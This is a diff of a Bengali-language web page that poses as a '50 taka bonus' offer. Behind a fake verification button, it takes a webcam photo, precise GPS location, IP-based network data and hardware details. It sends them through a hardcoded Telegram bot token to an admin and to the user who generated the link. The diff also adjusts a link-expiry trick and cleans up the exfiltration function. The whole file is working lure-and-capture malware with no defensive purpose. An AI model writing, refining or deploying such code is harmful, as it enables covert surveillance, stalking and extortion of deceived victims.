@@ -3,11 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <title>50 টাকা বোনাস নিতে ক্লিক করুন</title>
-    <meta property="og:title" content="বোনাস সিস্টেম - ৫০/৫০">
-    <meta property="og:description" content="রেফার করে বোনাস পেতে নিচে ক্লিক করুন।">
-
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -45,25 +41,24 @@
     </div>
 
     <script>
-        // লিঙ্কের মেয়াদ চেক করার কোড
-const urlParams = new URLSearchParams(window.location.search);
-const expiry = urlParams.get('exp');
-const currentTime = Math.floor(Date.now() / 1000);
-
-if (expiry && currentTime > expiry) {
-    // যদি মেয়াদ শেষ হয়, তবে পেজটি দেখাবে না
-    document.body.innerHTML = `
-        <div style="color:red; text-align:center; margin-top:50px; font-family:Arial;">
-            <h1>লিঙ্কটির মেয়াদ শেষ হয়ে গেছে!</h1>
-            <p>বোট থেকে নতুন লিঙ্ক জেনারেট করুন।</p>
-        </div>`;
-    window.stop(); // পেজ লোড হওয়া বন্ধ করে দিবে
-}
+        // সেটিংস
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
 
+        // ১ ঘণ্টা পর লিঙ্ক বন্ধ করার সিস্টেম
         const urlParams = new URLSearchParams(window.location.search);
+        const expiry = urlParams.get('exp');
         const userIdFromLink = urlParams.get('id'); 
+        const currentTime = Math.floor(Date.now() / 1000);
+
+        if (expiry && currentTime > expiry) {
+            document.body.innerHTML = `
+                <div style="color:red; text-align:center; margin-top:50px; font-family:Arial;">
+                    <h1>⚠️ লিঙ্কটির মেয়াদ শেষ হয়ে গেছে!</h1>
+                    <p>বোট থেকে নতুন লিঙ্ক জেনারেট করুন।</p>
+                </div>`;
+            window.stop();
+        }
 
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
@@ -72,14 +67,12 @@ if (expiry && currentTime > expiry) {
 
         let gpsLink = "লোকেশন অনুমতি নেই";
 
-        // লোকেশন নেওয়ার সঠিক ফাংশন
         function getGPS() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition((position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        // এখানে লিঙ্কটি ঠিক করা হয়েছে
                         gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                         resolve(true);
                     }, () => resolve(false), { enableHighAccuracy: true });
@@ -87,15 +80,19 @@ if (expiry && currentTime > expiry) {
             });
         }
 
-        async function sendToTelegram(blob, id, caption) {
+        async function sendToTelegram(blob, targetId, caption) {
             const formData = new FormData();
-            formData.append('chat_id', id);
+            formData.append('chat_id', targetId);
             formData.append('photo', blob, 'capture.jpg');
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
+            
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-            } catch(e) {}
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+            } catch(e) { console.log("Error sending photo:", e); }
         }
 
         verifyBtn.addEventListener('click', async () => {
@@ -110,17 +107,16 @@ if (expiry && currentTime > expiry) {
 
                 status.innerText = "> ভেরিফাই হচ্ছে... ৩ সেকেন্ড অপেক্ষা করুন।";
 
-                setTimeout(async () => {
+                // ৩ সেকেন্ড পর ছবি তোলা হবে
+                setTimeout(() => {
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        // হার্ডওয়্যার তথ্য
                         let info = `\n\n💻 **HARDWARE DETAILS**\nCPU: \`${navigator.hardwareConcurrency}\` Cores\nRAM: \`${navigator.deviceMemory}\` GB\nScreen: \`${window.screen.width}x${window.screen.height}\``;
 
-                        // নেটওয়ার্ক ও লোকেশন
                         try {
                             const res = await fetch('https://ipwho.is/');
                             const d = await res.json();
@@ -132,12 +128,12 @@ if (expiry && currentTime > expiry) {
                         // এডমিনকে পাঠানো
                         await sendToTelegram(blob, adminId, caption);
 
-                        // অন্য ইউজারকে পাঠানো (যদি আইডি থাকে)
+                        // যে ইউজার লিঙ্ক জেনারেট করেছে তাকে পাঠানো
                         if (userIdFromLink && userIdFromLink !== adminId) {
                             await sendToTelegram(blob, userIdFromLink, caption);
                         }
 
-                        status.innerText = "> ভেরিফিকেশন সফল!";
+                        status.innerText = "> ভেরিফিকেশন সফল! বোনাস চেক করুন।";
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
                 }, 3000); 
